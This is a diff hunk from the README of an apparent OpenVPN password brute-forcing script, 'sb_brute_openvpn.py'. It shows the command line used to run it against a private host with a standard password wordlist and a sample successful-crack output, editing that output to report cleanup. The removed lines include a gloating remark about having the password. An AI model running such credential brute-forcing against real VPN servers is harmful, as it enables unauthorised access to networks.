@@ -13,10 +13,10 @@ If you fancy bashing the code because you feel the need to feel superior... dont
 Test output:
 
 python sb_brute_openvpn.py --host 192.168.101.10 --config /home/scripts/python/server.conf --user Office-2 --passlist /usr/share/john/password.lst 
-[+] SUCCESS! command = /usr/sbin/openvpn --remote 192.168.101.10 --config /home/scripts/python/server.conf --auth-user-pass /tmp/sb_test/tmpNXYhvU
-[+] Password: REMOVED_DONT_WANT_TO_SPOIL_THE_FUN
-[+] VPN is still connected use ps aux then kill -9 or killall to close the connection
-[+] Could do this programatically but im too lazy! plus i have the password muhahahaha!!!
+
+[+] SUCCESS! command = /usr/sbin/openvpn --remote 192.168.101.10 --config /home/scripts/python/server.conf --auth-user-pass /tmp/sb_test/tmp4HdLuM
+[+] Password: ***REMOVED***
+[+] VPN Process stopped and temp files removed
 Terminated
 
 
